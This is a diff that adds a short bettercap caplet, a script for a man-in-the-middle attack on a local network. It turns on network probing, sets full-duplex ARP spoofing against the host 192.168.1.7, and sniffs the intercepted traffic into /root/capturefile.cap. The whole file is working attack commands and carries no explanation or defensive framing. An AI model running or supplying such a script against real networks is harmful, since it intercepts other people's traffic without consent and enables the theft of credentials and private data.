@@ -1,0 +1,11 @@
+# bettercap -iface mlan0
+
+net.probe on
+net.recon on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.7
+arp.spoof on
+set net.sniff.local true
+net.sniff.output /root/capturefile.cap
+net.sniff on
+
